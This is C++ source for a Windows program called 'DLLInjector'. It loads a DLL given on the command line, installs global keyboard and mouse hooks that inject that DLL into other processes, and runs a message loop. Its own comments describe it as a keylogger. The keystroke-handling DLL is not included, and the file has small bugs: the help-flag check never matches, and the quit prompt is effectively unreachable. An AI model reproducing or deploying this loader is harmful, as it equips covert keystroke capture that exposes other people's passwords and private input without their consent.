#include <windows.h>

#include <iostream>
#include <tchar.h> // using _tmain macro
#include <conio.h> // using _getch

// Used for x86 and x64 compatibility
#ifdef UNICODE
#define tcout std::wcout
#else
#define tcout std::cout
#endif

// CLI help message
void displayHelp() {
    tcout
        << TEXT("Usage: ./DLLInjector.exe <dll_path>\n")
        << TEXT("\nArguments:\n")
        << TEXT("  <dll_path>:      Path to the .dll file with the procedures.\n")
        << std::endl;
}

HHOOK hookKeyboard;
HHOOK hookMouse;

void WINAPI installGlobalHooks(HMODULE lib)
{
    // GetProcAddress is used with the Name-decoration convention (__stdcall calling convention is used to call Win32 API functions): 
    // An underscore (_) is prefixed to the name and the name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list.
#ifdef _WIN64
    HOOKPROC procedureKeyboard = (HOOKPROC)GetProcAddress(lib, "procedureKeyboard");
    HOOKPROC procedureMouse = (HOOKPROC)GetProcAddress(lib, "procedureMouse");
#else
    HOOKPROC procedureKeyboard = (HOOKPROC)GetProcAddress(lib, "_procedureKeyboard@12");
    HOOKPROC procedureMouse = (HOOKPROC)GetProcAddress(lib, "_procedureMouse@12");
#endif

    if (procedureKeyboard == NULL) {
        tcout << "Can't find Keyboard function in dll!" << std::endl;
        return;
    }

    if (procedureMouse == NULL) {
        tcout << "Can't find Mouse function in dll!" << std::endl;
        return;
    }

    // install hook keyboard
    hookKeyboard = SetWindowsHookEx(WH_KEYBOARD, procedureKeyboard, lib, 0);
    if (hookKeyboard == NULL) {
        tcout << "Keyboard hook failed to install!" << std::endl;
        return;
    }

    // install hook mouse
    hookMouse = SetWindowsHookEx(WH_MOUSE, procedureMouse, lib, 0);
    if (hookMouse == NULL) {
        tcout << "Mouse hook failed to install!" << std::endl;
        return;
    }

    tcout << "Hooks installed properly!" << std::endl;
}

int _tmain(int argc, TCHAR* argv[])
{
    if (argc != 2) {
        displayHelp();
        return 1;
    } else if (argv[1] == TEXT("--help")){
        displayHelp();
        return 0;
    }

    // Find the DLL with the procedures
    HMODULE lib = LoadLibrary(argv[1]);

    if (lib == NULL) {
        tcout << "Can't find dll!" << std::endl;
        return 1;
    }
    

    // Install the procedures
    installGlobalHooks(lib);

    MSG message;
    // GetMessage retrieves a message from the calling thread's message queue. 
    // The function dispatches incoming sent messages until a posted message is available for retrieval.
    while (GetMessage(&message, NULL, 0, 0))
    {
        // TranslateMessage translates virtual-key messages into character messages. 
        // The character messages are posted to the calling thread's message queue, to be read the next time the thread calls the GetMessage
        TranslateMessage(&message);

        //DispatchMessage dispatches a message to a window procedure.It is typically used to dispatch a message retrieved by the GetMessage function.
        DispatchMessage(&message);
    }

    tcout << TEXT("Press 'Q' to quit") << std::endl;
    int ch = ' ';
    while (ch != 'Q') {
        ch = _gettch();
        ch = toupper(ch);
    }

    // Stop the keylogger
    FreeLibrary(lib);
    UnhookWindowsHookEx(hookKeyboard);
    UnhookWindowsHookEx(hookMouse);
}